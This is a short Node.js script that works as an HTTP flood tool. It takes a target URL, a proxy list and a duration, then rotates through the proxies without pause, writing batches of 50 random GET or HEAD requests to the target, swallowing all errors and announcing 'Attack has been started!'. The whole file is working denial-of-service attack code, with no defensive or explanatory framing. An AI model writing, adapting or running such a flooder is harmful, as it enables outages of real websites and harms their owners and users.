const EventEmitter = require('events');
const fs = require('fs');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
const url = require('url');
const proxies = fs.readFileSync(process.argv[3], 'utf-8').replace(/\r/g, '').split('\n');
var methods = ["GET", "HEAD"];
var target = process.argv[2];
var time = process.argv[4];
var host = url.parse(target).host;
var theproxy = 0;
var proxy = proxies[theproxy];
var int = setInterval(() => {
    theproxy++;
    if (theproxy == proxies.length - 1) { theproxy = 0; }
    proxy = proxies[theproxy];
    if (proxy && proxy.length > 5) { proxy = proxy.split(':'); } else { return false; }
    var s = require('net').Socket();
    s.connect(proxy[1], proxy[0]);
    s.setTimeout(10000);
    for (var i = 0; i < 50; i++) { s.write(methods[Math.floor(Math.random() * methods.length)] + ' ' + target + '/ HTTP/1.1\r\nHost: ' + host + '\r\nConnection: Close\r\n\r\n'); }
    s.on('data', function () { setTimeout(function () { s.destroy(); return delete s; }, 5000); })
});
setTimeout(() => clearInterval(int), time * 1000);
console.log("Attack has been started!")
process.on('uncaughtException', function (err) { });
process.on('unhandledRejection', function (err) { });
